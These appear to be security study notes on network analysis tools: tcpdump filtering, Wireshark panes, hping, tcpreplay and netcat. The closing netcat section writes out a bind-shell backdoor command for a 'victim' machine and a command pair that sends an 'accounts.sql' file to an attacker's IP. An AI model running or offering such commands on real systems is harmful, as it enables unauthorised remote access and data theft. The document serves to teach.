**Packet capture** and **protocol analysis** are essential techniques for security monitoring, troubleshooting, and network auditing.

- **Packet analysis** involves inspecting individual frames (packets) at a granular level.  
- **Protocol analysis** uses aggregated data from multiple packets to evaluate communication patterns, identify anomalies, or reconstruct sessions.  

To perform this type of analysis, you need a **sniffer** tool that captures and decodes network traffic. Depending on the setup, you can capture:

- **Host-based traffic** (only packets to/from the device).  
- **Segment-based traffic** using:  
    - **SPAN/mirror ports**: Switches forward copies of traffic from selected ports to a designated port.  
    - **TAPs (Test Access Ports)**: Hardware devices inserted into network cabling to mirror traffic. TAPs can be **passive** or **active** (powered).
# tcpdump
Tcpdump is a powerful command-line tool used to capture network traffic on Linux systems.

Basic usage:  
tcpdump -i eth0

- This captures live traffic on the eth0 interface. Use Ctrl+C to stop.

Save captured traffic to a .pcap file:  
tcpdump -i eth0 -w capture.pcap

Read from a saved file:  
tcpdump -r capture.pcap

Tcpdump Filtering Options:
Filters reduce the amount of data captured or displayed. You can filter based on:

- **Type**: host, net, port, portrange
- **Direction**: src, dst (e.g., src port 80)
- **Protocol**: tcp, udp, icmp, ip6, etc.

Filters can be combined using:

- and (&&)
- or (||)
- not (!)
- Group expressions with parentheses

Example: Capture packets from source IP 10.1.0.100 destined for port 53 or 80:

tcpdump -i eth0 "src host 10.1.0.100 and (dst port 53 or dst port 80)"
# Wireshark
Wireshark Interface Overview:
- **Packet List Pane**: Displays a scrolling list of captured packets.
- **Packet Details Pane**: Shows structured information for the selected packet (by protocol layers).
- **Packet Bytes Pane**: Displays raw data in hexadecimal and ASCII.
# hping
hping is an open-source packet crafting tool that allows penetration testers to create and send custom packets to evaluate the behavior of firewalls and intrusion detection systems (IDS). It can be used for:

- **Host and port discovery**: Similar to Nmap, hping can probe IP addresses and TCP/UDP ports for responses.  
- **Firewall testing**: hping helps determine which ports or protocols are filtered by firewalls.  
- **Traceroute functionality**: If ICMP is blocked, hping can use alternative packet types (e.g., DNS over UDP/TCP) to trace the route to a target.  
- **Denial of Service (DoS) simulations**: hping can launch flood-based DoS attacks using randomized source IPs to test how well security devices handle such traffic in a controlled environment.
# tcpreplay
As its name implies, **tcpreplay** replays previously captured packets from a .pcap file through a network interface. It can also modify certain fields, such as MAC or IP addresses, during playback. This tool is particularly useful for:

- **Security analysis**: Replay malicious or suspicious traffic through an IDS or firewall to test detection rules.  
- **Traffic simulation**: Recreate specific network scenarios for testing without generating new traffic from scratch.
# netcat
**Netcat** is a versatile and lightweight tool for testing network connectivity, available on both Windows and Linux. It supports a range of use cases:

**Port scanning and banner grabbing**:  
Example:  
echo "head" | nc 10.1.0.1 -v 80

- This sends an HTTP request to port 80 and retrieves any banner or response.

**Remote shell access (backdoor)**:  
On the victim system:  
nc -l -p 666 -e cmd.exe

On the attacker's machine:  
nc 10.1.0.1 666

File transfer:  
Send a file from the target machine:  
type accounts.sql | nc 10.1.0.192 6666

Receive the file on the attacker's system:  
nc -l -p 6666 > accounts.sql